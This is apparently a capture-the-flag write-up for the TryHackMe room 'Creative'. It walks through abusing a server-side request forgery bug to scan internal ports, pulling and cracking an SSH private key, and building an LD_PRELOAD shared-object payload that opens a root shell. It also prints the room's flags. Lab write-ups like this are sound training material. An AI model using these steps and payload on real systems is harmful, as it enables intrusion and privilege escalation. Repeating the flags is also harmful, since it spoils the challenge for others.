# Creative - TryHackMe Writeup

> **Room:** Creative  
> **Platform:** TryHackMe  
> **Difficulty:** Easy  
> **Category:** Offensive Security / Web Exploitation / Privilege Escalation  
> **OS:** Linux

---

# Table of Contents

- Executive Summary
- Lab Information
- Enumeration
- Initial Web Enumeration
- Directory Enumeration
- Subdomain Enumeration
- SSRF Discovery
- Internal Port Discovery
- Local File Disclosure
- SSH Private Key Extraction
- SSH Access
- User Flag
- Privilege Escalation
- Root Flag
- Attack Chain
- MITRE ATT&CK Mapping
- Key Takeaways

---

# Executive Summary

Today we are going to solve another **TryHackMe Offensive Security** challenge named **Creative**.

The machine initially exposes only SSH and HTTP. After enumerating the web application, a hidden beta subdomain is discovered that contains an SSRF vulnerable URL testing feature. The SSRF vulnerability is abused to scan localhost services, eventually revealing an internal HTTP service running on port **1337**.

Using the internal file browser exposed on this service, sensitive files can be accessed directly, including the SSH private key of user **saad**. After cracking the key passphrase using **John the Ripper**, SSH access is obtained.

During privilege escalation, inspection of `.bash_history` reveals previous administrator activity. Running `sudo -l` shows that the **LD_PRELOAD** environment variable is preserved while executing **ping** as root. This classic misconfiguration allows loading a malicious shared object and spawning a root shell.

---

# Lab Information

| Field | Value |
|-------|-------|
| Machine | Creative |
| Platform | TryHackMe |
| Difficulty | Easy |
| Target IP | `10.48.185.205` |
| Operating System | Linux |

---

# Enumeration

The target IP is provided by the room.

```
Main IP :: 10.48.185.205
```

---

## Full TCP Scan

```bash
nmap -p- 10.48.185.205
```

Result

```
PORT   STATE SERVICE

22/tcp open ssh

80/tcp open http
```

Only two ports are exposed externally.

---

## Service Detection

Next, a version detection scan is performed.

```bash
nmap -sCV 10.48.185.205
```


```
22/tcp open ssh OpenSSH 8.2p1 Ubuntu

80/tcp open http nginx 1.18.0

http-title:
Did not follow redirect to http://creative.thm
```

Since HTTP redirects to **creative.thm**, the hostname is added to `/etc/hosts`.

```bash
echo "10.48.185.205 creative.thm" | sudo tee -a /etc/hosts
```

---

# Initial Web Enumeration

Opening the website displays a service-based landing page.

No obvious attack surface is visible.

---

# Directory Enumeration

Gobuster is used to enumerate directories.

```bash
gobuster dir \
-u http://creative.thm \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt
```

Result

```
/assets
```

Only a static assets directory is found.

Since no interesting files exist, further enumeration continues.

---

# Subdomain Enumeration

The next step is virtual host fuzzing using FFUF.

```bash
ffuf \
-u http://creative.thm \
-H "Host: FUZZ.creative.thm" \
-w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-ac
```

Result

```
beta
```

A new virtual host is discovered.

```
beta.creative.thm
```

Add it to hosts.

```bash
echo "10.48.185.205 beta.creative.thm" | sudo tee -a /etc/hosts
```

---

# Beta Application

Browsing to the beta site reveals a **URL Testing** application.

Applications that fetch arbitrary URLs are often vulnerable to **Server-Side Request Forgery (SSRF)**.

---

# SSRF Discovery

Testing localhost confirms SSRF behavior.

Initially, SSRFMap was attempted.

The POST request was saved and tested.

Unfortunately SSRFMap did not automatically enumerate internal services.

Instead, manual fuzzing is performed.

---

# Internal Port Discovery

Generate a list of every TCP port.

```bash
seq 65535 > ports.txt
```

Then fuzz localhost through the SSRF endpoint.

```bash
ffuf \
-w ports.txt \
-u http://beta.creative.thm/ \
-X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "url=http://127.0.0.1:FUZZ" \
-fw 3
```

![Internal Port Scan](q7)

Result

```
1337
```

An internal service is listening on:

```
127.0.0.1:1337
```

---

# Internal File Browser

Accessing

```
http://127.0.0.1:1337/
```

through SSRF displays an internal file listing.

From there navigation is possible into

```
/home
```

Two users are present.

```
ubuntu

saad
```

Eventually the following file is reached.

```
/home/saad/.ssh/id_rsa
```

The SSH private key can now be downloaded.

*(Private key omitted from this public writeup.)*

---

# Cracking the SSH Key

Attempting SSH immediately requests a passphrase.

```bash
ssh saad@creative.thm -i id_rsa
```

```
Enter passphrase for key
```

Convert the key into a John hash.

```bash
ssh2john id_rsa > hash
```

Crack it.

```bash
john \
--wordlist=/usr/share/wordlists/rockyou.txt \
hash
```

Recovered passphrase

```
sweetness
```

SSH again.

```bash
ssh saad@creative.thm -i id_rsa
```

Login succeeds.

---

# User Flag

Retrieve the user flag.

```bash
cat user.txt
```


```
9a1ce90a7653d74ab98630b47b8b4a84
```

---

# Privilege Escalation

The first place to inspect is command history.

```bash
cat ~/.bash_history
```

Interesting entries appear.

```
sudo -l

echo "saad:MyStrongestPasswordYet$4291" > creds.txt

mysql

sudo su
```

Although no valid credentials remain, this indicates previous administrative activity.

---

## Sudo Permissions

Running

```bash
sudo -l
```

returns

```
env_keep+=LD_PRELOAD
```

and

```
(root)
/usr/bin/ping
```


This is a well-known privilege escalation vector.

Because **LD_PRELOAD** is preserved, arbitrary shared libraries can execute before the intended binary.

---

# Building the Payload

Create a malicious shared object.

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

void _init()
{
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

Save as

```
shell.c
```

Compile it.

```bash
gcc -fPIC \
-shared \
-o shell.so \
shell.c \
-nostartfiles
```

Verify.

```bash
ls -al shell.so
```

```
-rwxrwxr-x
```

---

# Root Shell

Execute ping while loading the malicious library.

```bash
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping
```

A root shell is immediately spawned.

Verify.

```bash
whoami
```

```
root
```

Retrieve the flag.

```bash
cat /root/root.txt
```

```
992bfd94b90da48634aed182aae7b99f
```

Machine rooted successfully.

---

# Attack Chain

```
External Enumeration

↓

HTTP Website

↓

Subdomain Enumeration

↓

beta.creative.thm

↓

SSRF Vulnerability

↓

Internal Port Scan

↓

Port 1337

↓

Internal File Browser

↓

Read /home/saad/.ssh/id_rsa

↓

Crack SSH Passphrase

↓

SSH Login

↓

Inspect bash_history

↓

sudo -l

↓

LD_PRELOAD Allowed

↓

Malicious Shared Library

↓

Root Shell
```

---

# MITRE ATT&CK Mapping

| Phase | Technique | ID |
|----------|------------------------------|-------------|
| Active Scanning | Network Service Discovery | T1046 |
| Web Enumeration | Gather Victim Network Information | T1590 |
| SSRF | Exploit Public-Facing Application | T1190 |
| File Disclosure | Data from Local System | T1005 |
| Credential Access | Brute Force (Password Cracking) | T1110 |
| Remote Access | SSH | T1021.004 |
| Discovery | File and Directory Discovery | T1083 |
| Privilege Escalation | Abuse Elevation Control Mechanism | T1548 |
| LD_PRELOAD | Hijack Execution Flow | T1574 |

---

# Key Takeaways

- Hidden virtual hosts should always be enumerated.
- SSRF vulnerabilities can expose internal services that are otherwise unreachable.
- Internal applications often reveal sensitive files when improperly configured.
- SSH private keys protected with weak passphrases can often be cracked using common wordlists.
- `.bash_history` frequently leaks valuable operational information.
- Allowing **LD_PRELOAD** in sudo configurations is extremely dangerous and can directly lead to full system compromise.
- Proper sudo hardening and environment sanitization are critical to preventing privilege escalation.

---

# Conclusion

Creative is an excellent beginner-friendly room that demonstrates how multiple seemingly low-impact issues can be chained together into full system compromise. Starting from basic web enumeration, the attack progresses through subdomain discovery, SSRF exploitation, internal service enumeration, sensitive file disclosure, SSH credential recovery, and finally a classic **LD_PRELOAD** privilege escalation.

The room reinforces several important penetration testing concepts, including thorough enumeration, exploitation of server-side request forgery, password cracking workflows, Linux privilege escalation techniques, and the importance of secure sudo configurations. Overall, it provides a realistic end-to-end attack path that closely resembles scenarios encountered during real-world web application assessments.
